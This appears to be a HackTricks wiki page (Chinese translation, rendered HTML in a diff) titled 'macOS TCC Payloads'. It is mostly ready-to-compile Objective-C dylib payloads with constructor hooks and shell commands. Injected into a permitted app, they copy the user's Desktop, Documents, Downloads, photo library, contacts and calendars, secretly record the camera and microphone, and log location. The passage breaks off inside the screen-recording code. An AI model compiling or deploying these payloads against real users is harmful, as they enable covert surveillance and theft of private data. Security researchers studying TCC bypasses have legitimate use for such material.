@@ -1,0 +1,1060 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>macOS TCC Payloads</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../../favicon.png">
+        <link rel="stylesheet" href="../../../../css/variables.css">
+        <link rel="stylesheet" href="../../../../css/general.css">
+        <link rel="stylesheet" href="../../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../../highlight.css">
+        <link rel="stylesheet" href="../../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="macos-tcc-payloads"><a class="header" href="#macos-tcc-payloads">macOS TCC Payloads</a></h1>
+<p>{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<h3 id="桌面"><a class="header" href="#桌面">桌面</a></h3>
+<ul>
+<li><strong>权限</strong>：无</li>
+<li><strong>TCC</strong>：kTCCServiceSystemPolicyDesktopFolder</li>
+</ul>
+<p>{% tabs %}
+{% tab title="ObjetiveC" %}
+将 <code>$HOME/Desktop</code> 复制到 <code>/tmp/desktop</code>。</p>
+<pre><code class="language-objectivec">#include &lt;syslog.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#import &lt;Foundation/Foundation.h&gt;
+
+// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m
+
+__attribute__((constructor))
+void myconstructor(int argc, const char **argv)
+{
+freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
+
+NSFileManager *fileManager = [NSFileManager defaultManager];
+NSError *error = nil;
+
+// Get the path to the user's Pictures folder
+NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Desktop"];
+NSString *tmpPhotosPath = @"/tmp/desktop";
+
+// Copy the contents recursively
+if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&amp;error]) {
+NSLog(@"Error copying items: %@", error);
+}
+
+NSLog(@"Copy completed successfully.", error);
+
+fclose(stderr); // Close the file stream
+}
+</code></pre>
+<p>{% endtab %}</p>
+<p>{% tab title="Shell" %}
+将 <code>$HOME/Desktop</code> 复制到 <code>/tmp/desktop</code>。</p>
+<pre><code class="language-bash">cp -r "$HOME/Desktop" "/tmp/desktop"
+</code></pre>
+<p>{% endtab %}
+{% endtabs %}</p>
+<h3 id="文档"><a class="header" href="#文档">文档</a></h3>
+<ul>
+<li><strong>权限</strong>: 无</li>
+<li><strong>TCC</strong>: <code>kTCCServiceSystemPolicyDocumentsFolder</code></li>
+</ul>
+<p>{% tabs %}
+{% tab title="ObjetiveC" %}
+将 <code>$HOME/Documents</code> 复制到 <code>/tmp/documents</code>。</p>
+<pre><code class="language-objectivec">#include &lt;syslog.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#import &lt;Foundation/Foundation.h&gt;
+
+// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m
+
+__attribute__((constructor))
+void myconstructor(int argc, const char **argv)
+{
+freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
+
+NSFileManager *fileManager = [NSFileManager defaultManager];
+NSError *error = nil;
+
+// Get the path to the user's Pictures folder
+NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
+NSString *tmpPhotosPath = @"/tmp/documents";
+
+// Copy the contents recursively
+if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&amp;error]) {
+NSLog(@"Error copying items: %@", error);
+}
+
+NSLog(@"Copy completed successfully.", error);
+
+fclose(stderr); // Close the file stream
+}
+</code></pre>
+<p>{% endtab %}</p>
+<p>{% tab title="Shell" %}
+将 <code>$HOME/</code>Documents 复制到 <code>/tmp/documents</code>。</p>
+<pre><code class="language-bash">cp -r "$HOME/Documents" "/tmp/documents"
+</code></pre>
+<p>{% endtab %}
+{% endtabs %}</p>
+<h3 id="下载"><a class="header" href="#下载">下载</a></h3>
+<ul>
+<li><strong>权限</strong>: 无</li>
+<li><strong>TCC</strong>: <code>kTCCServiceSystemPolicyDownloadsFolder</code></li>
+</ul>
+<p>{% tabs %}
+{% tab title="ObjetiveC" %}
+将 <code>$HOME/Downloads</code> 复制到 <code>/tmp/downloads</code>。</p>
+<pre><code class="language-objectivec">#include &lt;syslog.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#import &lt;Foundation/Foundation.h&gt;
+
+// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m
+
+__attribute__((constructor))
+void myconstructor(int argc, const char **argv)
+{
+freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
+
+NSFileManager *fileManager = [NSFileManager defaultManager];
+NSError *error = nil;
+
+// Get the path to the user's Pictures folder
+NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Downloads"];
+NSString *tmpPhotosPath = @"/tmp/downloads";
+
+// Copy the contents recursively
+if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&amp;error]) {
+NSLog(@"Error copying items: %@", error);
+}
+
+NSLog(@"Copy completed successfully.", error);
+
+fclose(stderr); // Close the file stream
+}
+</code></pre>
+<p>{% endtab %}</p>
+<p>{% tab title="Shell" %}
+将 <code>$HOME/Dowloads</code> 复制到 <code>/tmp/downloads</code>。</p>
+<pre><code class="language-bash">cp -r "$HOME/Downloads" "/tmp/downloads"
+</code></pre>
+<p>{% endtab %}
+{% endtabs %}</p>
+<h3 id="照片库"><a class="header" href="#照片库">照片库</a></h3>
+<ul>
+<li><strong>权限</strong>: <code>com.apple.security.personal-information.photos-library</code></li>
+<li><strong>TCC</strong>: <code>kTCCServicePhotos</code></li>
+</ul>
+<p>{% tabs %}
+{% tab title="ObjetiveC" %}
+将 <code>$HOME/Pictures/Photos Library.photoslibrary</code> 复制到 <code>/tmp/photos</code>。</p>
+<pre><code class="language-objectivec">#include &lt;syslog.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#import &lt;Foundation/Foundation.h&gt;
+
+// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m
+
+__attribute__((constructor))
+void myconstructor(int argc, const char **argv)
+{
+freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
+
+NSFileManager *fileManager = [NSFileManager defaultManager];
+NSError *error = nil;
+
+// Get the path to the user's Pictures folder
+NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Pictures/Photos Library.photoslibrary"];
+NSString *tmpPhotosPath = @"/tmp/photos";
+
+// Copy the contents recursively
+if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&amp;error]) {
+NSLog(@"Error copying items: %@", error);
+}
+
+NSLog(@"Copy completed successfully.", error);
+
+fclose(stderr); // Close the file stream
+}
+</code></pre>
+<p>{% endtab %}</p>
+<p>{% tab title="Shell" %}
+将 <code>$HOME/Pictures/Photos Library.photoslibrary</code> 复制到 <code>/tmp/photos</code>。</p>
+<pre><code class="language-bash">cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
+</code></pre>
+<p>{% endtab %}
+{% endtabs %}</p>
+<h3 id="联系人"><a class="header" href="#联系人">联系人</a></h3>
+<ul>
+<li><strong>权限</strong>: <code>com.apple.security.personal-information.addressbook</code></li>
+<li><strong>TCC</strong>: <code>kTCCServiceAddressBook</code></li>
+</ul>
+<p>{% tabs %}
+{% tab title="ObjetiveC" %}
+将 <code>$HOME/Library/Application Support/AddressBook</code> 复制到 <code>/tmp/contacts</code>。</p>
+<pre><code class="language-objectivec">#include &lt;syslog.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#import &lt;Foundation/Foundation.h&gt;
+
+// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m
+
+__attribute__((constructor))
+void myconstructor(int argc, const char **argv)
+{
+freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
+
+NSFileManager *fileManager = [NSFileManager defaultManager];
+NSError *error = nil;
+
+// Get the path to the user's Pictures folder
+NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Application Support/AddressBook"];
+NSString *tmpPhotosPath = @"/tmp/contacts";
+
+// Copy the contents recursively
+if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&amp;error]) {
+NSLog(@"Error copying items: %@", error);
+}
+
+NSLog(@"Copy completed successfully.", error);
+
+fclose(stderr); // Close the file stream
+}
+</code></pre>
+<p>{% endtab %}</p>
+<p>{% tab title="Shell" %}
+将 <code>$HOME/Library/Application Support/AddressBook</code> 复制到 <code>/tmp/contacts</code>。</p>
+<pre><code class="language-bash">cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
+</code></pre>
+<p>{% endtab %}
+{% endtabs %}</p>
+<h3 id="日历"><a class="header" href="#日历">日历</a></h3>
+<ul>
+<li><strong>权限</strong>: <code>com.apple.security.personal-information.calendars</code></li>
+<li><strong>TCC</strong>: <code>kTCCServiceCalendar</code></li>
+</ul>
+<p>{% tabs %}
+{% tab title="ObjectiveC" %}
+将 <code>$HOME/Library/Calendars</code> 复制到 <code>/tmp/calendars</code>。</p>
+<pre><code class="language-objectivec">#include &lt;syslog.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#import &lt;Foundation/Foundation.h&gt;
+
+// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m
+
+__attribute__((constructor))
+void myconstructor(int argc, const char **argv)
+{
+freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
+
+NSFileManager *fileManager = [NSFileManager defaultManager];
+NSError *error = nil;
+
+// Get the path to the user's Pictures folder
+NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Calendars/"];
+NSString *tmpPhotosPath = @"/tmp/calendars";
+
+// Copy the contents recursively
+if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&amp;error]) {
+NSLog(@"Error copying items: %@", error);
+}
+
+NSLog(@"Copy completed successfully.", error);
+
+fclose(stderr); // Close the file stream
+}
+</code></pre>
+<p>{% endtab %}</p>
+<p>{% tab title="Shell" %}
+将 <code>$HOME/Library/Calendars</code> 复制到 <code>/tmp/calendars</code>。</p>
+<pre><code class="language-bash">cp -r "$HOME/Library/Calendars" "/tmp/calendars"
+</code></pre>
+<p>{% endtab %}
+{% endtabs %}</p>
+<h3 id="摄像头"><a class="header" href="#摄像头">摄像头</a></h3>
+<ul>
+<li><strong>权限</strong>: <code>com.apple.security.device.camera</code></li>
+<li><strong>TCC</strong>: <code>kTCCServiceCamera</code></li>
+</ul>
+<p>{% tabs %}
+{% tab title="ObjetiveC - 录制" %}
+录制一个3秒的视频并将其保存在 <strong><code>/tmp/recording.mov</code></strong></p>
+<pre><code class="language-objectivec">#import &lt;Foundation/Foundation.h&gt;
+#import &lt;AVFoundation/AVFoundation.h&gt;
+
+// gcc -framework Foundation -framework AVFoundation -dynamiclib CamTest.m -o CamTest.dylib
+// Code from: https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4
+
+@interface VideoRecorder : NSObject &lt;AVCaptureFileOutputRecordingDelegate&gt;
+@property (strong, nonatomic) AVCaptureSession *captureSession;
+@property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput;
+@property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;
+- (void)startRecording;
+- (void)stopRecording;
+@end
+@implementation VideoRecorder
+- (instancetype)init {
+self = [super init];
+if (self) {
+[self setupCaptureSession];
+}
+return self;
+}
+- (void)setupCaptureSession {
+self.captureSession = [[AVCaptureSession alloc] init];
+self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;
+AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
+NSError *error;
+self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&amp;error];
+if (error) {
+NSLog(@"Error setting up video device input: %@", [error localizedDescription]);
+return;
+}
+if ([self.captureSession canAddInput:self.videoDeviceInput]) {
+[self.captureSession addInput:self.videoDeviceInput];
+}
+self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];
+if ([self.captureSession canAddOutput:self.movieFileOutput]) {
+[self.captureSession addOutput:self.movieFileOutput];
+}
+}
+- (void)startRecording {
+[self.captureSession startRunning];
+NSString *outputFilePath = @"/tmp/recording.mov";
+NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
+[self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
+NSLog(@"Recording started");
+}
+- (void)stopRecording {
+[self.movieFileOutput stopRecording];
+[self.captureSession stopRunning];
+NSLog(@"Recording stopped");
+}
+#pragma mark - AVCaptureFileOutputRecordingDelegate
+- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
+didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
+fromConnections:(NSArray&lt;AVCaptureConnection *&gt; *)connections
+error:(NSError *)error {
+if (error) {
+NSLog(@"Recording failed: %@", [error localizedDescription]);
+} else {
+NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
+}
+}
+@end
+__attribute__((constructor))
+static void myconstructor(int argc, const char **argv) {
+freopen("/tmp/logs.txt", "a", stderr);
+VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];
+[videoRecorder startRecording];
+[NSThread sleepForTimeInterval:3.0];
+[videoRecorder stopRecording];
+[[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:3.0]];
+fclose(stderr); // Close the file stream
+}
+</code></pre>
+<p>{% endtab %}</p>
+<p>{% tab title="ObjectiveC - 检查" %}
+检查程序是否有权访问相机。</p>
+<pre><code class="language-objectivec">#import &lt;Foundation/Foundation.h&gt;
+#import &lt;AVFoundation/AVFoundation.h&gt;
+
+// gcc -framework Foundation -framework AVFoundation -dynamiclib CamTest.m -o CamTest.dylib
+// Code from https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4
+
+@interface CameraAccessChecker : NSObject
++ (BOOL)hasCameraAccess;
+@end
+@implementation CameraAccessChecker
++ (BOOL)hasCameraAccess {
+AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
+if (status == AVAuthorizationStatusAuthorized) {
+NSLog(@"[+] Access to camera granted.");
+return YES;
+} else {
+NSLog(@"[-] Access to camera denied.");
+return NO;
+}
+}
+@end
+__attribute__((constructor))
+static void telegram(int argc, const char **argv) {
+freopen("/tmp/logs.txt", "a", stderr);
+[CameraAccessChecker hasCameraAccess];
+fclose(stderr); // Close the file stream
+}
+</code></pre>
+<p>{% endtab %}</p>
+<p>{% tab title="Shell" %}
+用相机拍照</p>
+<pre><code class="language-bash">ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
+</code></pre>
+<p>{% endtab %}
+{% endtabs %}</p>
+<h3 id="麦克风"><a class="header" href="#麦克风">麦克风</a></h3>
+<ul>
+<li><strong>权限</strong>: <strong>com.apple.security.device.audio-input</strong></li>
+<li><strong>TCC</strong>: <code>kTCCServiceMicrophone</code></li>
+</ul>
+<p>{% tabs %}
+{% tab title="ObjetiveC - 录音" %}
+录制5秒音频并将其存储在<code>/tmp/recording.m4a</code></p>
+<pre><code class="language-objectivec">#import &lt;Foundation/Foundation.h&gt;
+#import &lt;AVFoundation/AVFoundation.h&gt;
+
+// Code from https://www.vicarius.io/vsociety/posts/cve-2023-26818-exploit-macos-tcc-bypass-w-telegram-part-1-2
+// gcc -dynamiclib -framework Foundation -framework AVFoundation Micexploit.m -o Micexploit.dylib
+
+@interface AudioRecorder : NSObject &lt;AVCaptureFileOutputRecordingDelegate&gt;
+
+@property (strong, nonatomic) AVCaptureSession *captureSession;
+@property (strong, nonatomic) AVCaptureDeviceInput *audioDeviceInput;
+@property (strong, nonatomic) AVCaptureMovieFileOutput *audioFileOutput;
+
+- (void)startRecording;
+- (void)stopRecording;
+
+@end
+
+@implementation AudioRecorder
+
+- (instancetype)init {
+self = [super init];
+if (self) {
+[self setupCaptureSession];
+}
+return self;
+}
+
+- (void)setupCaptureSession {
+self.captureSession = [[AVCaptureSession alloc] init];
+self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;
+
+AVCaptureDevice *audioDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeAudio];
+NSError *error;
+self.audioDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:audioDevice error:&amp;error];
+
+if (error) {
+NSLog(@"Error setting up audio device input: %@", [error localizedDescription]);
+return;
+}
+
+if ([self.captureSession canAddInput:self.audioDeviceInput]) {
+[self.captureSession addInput:self.audioDeviceInput];
+}
+
+self.audioFileOutput = [[AVCaptureMovieFileOutput alloc] init];
+
+if ([self.captureSession canAddOutput:self.audioFileOutput]) {
+[self.captureSession addOutput:self.audioFileOutput];
+}
+}
+
+- (void)startRecording {
+[self.captureSession startRunning];
+NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"recording.m4a"];
+NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
+[self.audioFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
+NSLog(@"Recording started");
+}
+
+- (void)stopRecording {
+[self.audioFileOutput stopRecording];
+[self.captureSession stopRunning];
+NSLog(@"Recording stopped");
+}
+
+#pragma mark - AVCaptureFileOutputRecordingDelegate
+
+- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
+didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
+fromConnections:(NSArray&lt;AVCaptureConnection *&gt; *)connections
+error:(NSError *)error {
+if (error) {
+NSLog(@"Recording failed: %@", [error localizedDescription]);
+} else {
+NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
+}
+NSLog(@"Saved to %@", outputFileURL.path);
+}
+
+@end
+
+__attribute__((constructor))
+static void myconstructor(int argc, const char **argv) {
+
+freopen("/tmp/logs.txt", "a", stderr);
+AudioRecorder *audioRecorder = [[AudioRecorder alloc] init];
+
+[audioRecorder startRecording];
+[NSThread sleepForTimeInterval:5.0];
+[audioRecorder stopRecording];
+
+[[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
+fclose(stderr); // Close the file stream
+}
+</code></pre>
+<p>{% endtab %}</p>
+<p>{% tab title="ObjectiveC - 检查" %}
+检查应用程序是否有权访问麦克风。</p>
+<pre><code class="language-objectivec">#import &lt;Foundation/Foundation.h&gt;
+#import &lt;AVFoundation/AVFoundation.h&gt;
+
+// From https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4
+// gcc -framework Foundation -framework AVFoundation -dynamiclib MicTest.m -o MicTest.dylib
+
+@interface MicrophoneAccessChecker : NSObject
++ (BOOL)hasMicrophoneAccess;
+@end
+@implementation MicrophoneAccessChecker
++ (BOOL)hasMicrophoneAccess {
+AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio];
+if (status == AVAuthorizationStatusAuthorized) {
+NSLog(@"[+] Access to microphone granted.");
+return YES;
+} else {
+NSLog(@"[-] Access to microphone denied.");
+return NO;
+}
+}
+@end
+__attribute__((constructor))
+static void telegram(int argc, const char **argv) {
+[MicrophoneAccessChecker hasMicrophoneAccess];
+}
+</code></pre>
+<p>{% endtab %}</p>
+<p>{% tab title="Shell" %}
+录制5秒音频并将其存储在<code>/tmp/recording.wav</code></p>
+<pre><code class="language-bash"># Check the microphones
+ffmpeg -f avfoundation -list_devices true -i ""
+# Use microphone from index 1 from the previous list to record
+ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
+</code></pre>
+<p>{% endtab %}
+{% endtabs %}</p>
+<h3 id="位置"><a class="header" href="#位置">位置</a></h3>
+<p>{% hint style="success" %}
+要让应用获取位置，<strong>位置服务</strong>（来自隐私与安全）<strong>必须启用，</strong> 否则将无法访问。
+{% endhint %}</p>
+<ul>
+<li><strong>权限</strong>: <code>com.apple.security.personal-information.location</code></li>
+<li><strong>TCC</strong>: 在 <code>/var/db/locationd/clients.plist</code> 中授予</li>
+</ul>
+<p>{% tabs %}
+{% tab title="ObjectiveC" %}
+将位置写入 <code>/tmp/logs.txt</code></p>
+<pre><code class="language-objectivec">#include &lt;syslog.h&gt;
+#include &lt;stdio.h&gt;
+#import &lt;Foundation/Foundation.h&gt;
+#import &lt;CoreLocation/CoreLocation.h&gt;
+
+@interface LocationManagerDelegate : NSObject &lt;CLLocationManagerDelegate&gt;
+@end
+
+@implementation LocationManagerDelegate
+
+- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray&lt;CLLocation *&gt; *)locations {
+CLLocation *location = [locations lastObject];
+NSLog(@"Current location: %@", location);
+exit(0); // Exit the program after receiving the first location update
+}
+
+- (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error {
+NSLog(@"Error getting location: %@", error);
+exit(1); // Exit the program on error
+}
+
+@end
+
+__attribute__((constructor))
+void myconstructor(int argc, const char **argv)
+{
+freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
+
+NSLog(@"Getting location");
+CLLocationManager *locationManager = [[CLLocationManager alloc] init];
+LocationManagerDelegate *delegate = [[LocationManagerDelegate alloc] init];
+locationManager.delegate = delegate;
+
+[locationManager requestWhenInUseAuthorization]; // or use requestAlwaysAuthorization
+[locationManager startUpdatingLocation];
+
+NSRunLoop *runLoop = [NSRunLoop currentRunLoop];
+while (true) {
+[runLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
+}
+
+NSLog(@"Location completed successfully.");
+freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
+}
+</code></pre>
+<p>{% endtab %}</p>
+<p>{% tab title="Shell" %}
+获取位置访问权限</p>
+<pre><code>???
+</code></pre>
+<p>{% endtab %}
+{% endtabs %}</p>
+<h3 id="屏幕录制"><a class="header" href="#屏幕录制">屏幕录制</a></h3>
+<ul>
+<li><strong>权限</strong>: 无</li>
+<li><strong>TCC</strong>: <code>kTCCServiceScreenCapture</code></li>
+</ul>
+<p>{% tabs %}
+{% tab title="ObjectiveC" %}
+在<code>/tmp/screen.mov</code>中录制主屏幕5秒</p>
+<pre><code class="language-objectivec">#import &lt;Foundation/Foundation.h&gt;
+#import &lt;AVFoundation/AVFoundation.h&gt;
+
+// clang -framework Foundation -framework AVFoundation -framework CoreVideo -framework CoreMedia -framework CoreGraphics -o ScreenCapture ScreenCapture.m
+
+@interface MyRecordingDelegate : NSObject &lt;AVCaptureFileOutputRecordingDelegate&gt;
+@end
+
+@implementation MyRecordingDelegate
+
+- (void)captureOutput:(AVCaptureFileOutput *)output
+didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
